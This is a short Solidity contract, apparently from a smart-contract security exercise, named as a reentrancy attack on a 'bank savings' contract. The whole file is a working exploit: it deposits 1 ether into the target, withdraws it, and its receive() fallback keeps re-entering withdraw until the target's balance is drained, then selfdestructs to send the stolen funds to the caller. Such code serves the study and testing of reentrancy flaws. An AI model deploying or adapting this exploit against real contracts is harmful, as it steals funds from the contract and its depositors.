// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "../interfaces/IReentrancyAttackOnBankSavings.sol";

contract ReentrancyAttackOnBankSavings {
    IReentrancyAttackOnBankSavings private immutable target;

    constructor(address _target) {
        target = IReentrancyAttackOnBankSavings(_target);
    }

    function attack() external payable {
        target.donate{value: 1 ether}(address(this));
        target.withdraw(1 ether);
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}
